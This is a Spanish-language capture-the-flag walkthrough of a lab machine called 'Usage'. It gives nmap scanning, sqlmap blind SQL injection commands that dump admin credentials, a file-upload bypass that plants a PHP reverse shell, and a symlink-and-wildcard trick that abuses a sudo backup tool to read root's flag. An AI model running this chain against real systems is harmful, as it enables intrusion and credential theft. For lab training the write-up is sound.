#Easy #fuzzing #fuzzing #nmap #Linux 
### Ping
```python
ping -c 1 10.10.11.18
PING 10.10.11.18 (10.10.11.18) 56(84) bytes of data.
64 bytes from 10.10.11.18: icmp_seq=1 ttl=63 time=70.9 ms

--- 10.10.11.18 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 70.927/70.927/70.927/0.000 ms
```

### TTL 63=Linux

### nmap
```python
sudo nmap -p- --open -sC -sV --min-rate 3000 -Pn 10.10.11.18 -oN Scan
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 19:43 EDT
Nmap scan report for 10.10.11.18
Host is up (0.069s latency).
Not shown: 65527 closed tcp ports (reset), 6 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.51 seconds
```


### Enumeración del puerto 80 (http)

![[Pasted image 20240611211318.png]]

podemos registrarnos en la pagina web pero no tenemos mucha información
![[Pasted image 20240611211324.png]]

si intentamos cambiar la contraseña podemos notar que nos da como resultado una notificación donde podemos ver nuestro correo
![[Pasted image 20240611211329.png]]

### sqlmap
después de hacer un montón de pruebas hemos descubierto que el parámetro mail es vulnerable a sqli blind por lo que vamos a comprobarla con 
```python
sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump
```

![[Pasted image 20240611211338.png]]

![[Pasted image 20240611211343.png]]
###### con este ataque podemos determinar que es una blind sqli por lo cual el ataque puede tardar bastante. 

### Blind SQLI

```python
sqlmap -r request.txt --level 5 --risk 3 -p email --batch
```

![[Pasted image 20240611211349.png]]

`obtenemos el nombre de la base de datos y el nombre de las tablas`
![[Pasted image 20240611211355.png]]

### sqlmap 
una ves obtenemos la información de la base de datos vamos a realizar la solicitud apuntando al username y password 
```python
sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users -C username,password --dump --threads 10
```

![[Pasted image 20240611211410.png]]

![[Pasted image 20240611211414.png]]

### web
de esta manera logramos conseguir las credenciales que estaban en la base de datos vulnerando el parámetro mal para obtener acceso a la pagina web
`en el apartado de administrador podemos subir un archivo.jpg que vamos a utilizar para meter una reverse shell oculta`
![[Pasted image 20240611211420.png]]

`Burpsuite`
interceptamos y cambiamos la extensión del archivo para agregar .php de la manera que se muestra en la imagen
![[Pasted image 20240611211426.png]]

`a la derecha podemos ver que nos da un estatus 302 lo que significa que esta haciendo una redireccion. simplemente seguimos la redireccion y listo`
![[Pasted image 20240611211431.png]]

`haciendo Fuzzing podemos descubrir que existe el directorio /uploads/images/ y aqui dentro se encuentra nuestro archivo que al llamarlo nos entabla una reverse shell. para ello debemos estar a la escucha`
![[Pasted image 20240611211437.png]]

### rshell
aqui obtenemos una reverse shell como el usuario dash
![[Pasted image 20240611211443.png]]

### User Pivoting
hemos conseguido un usuario llamado xander y también un archivo oculto dentro del directorio de dash que hemos logrado leer y contiene unas credenciales
![[Pasted image 20240611211448.png]]

### ssh
usamos el protocolo ssh para conectarnos como el usuario xander
![[Pasted image 20240611211452.png]]

### sudo -l
tenemos permisos de sudo para un binario llamado `/usr/bin/usage_management` el cual tiene 3 opciones y podemos ver que la ruta donde se esta ejecutando estas opciones es `/var/www/html`
![[Pasted image 20240611211458.png]]

`Wildcard`
usando este script podemos explicar esta Wildcard para obtener el root.txt de la siguiente forma
```python
	>cd /var/www/html/
	
	>touch '@root.txt'
	
	>ln -s -r /root/root.txt root.txt
	
	>sudo /usr/bin/usage_management #Opcion 1 (Project Backup)
	
```
en el apartado de WARNING: No more file podemos leer la flag

![[Pasted image 20240611211506.png]]
### WE ARE ROOT
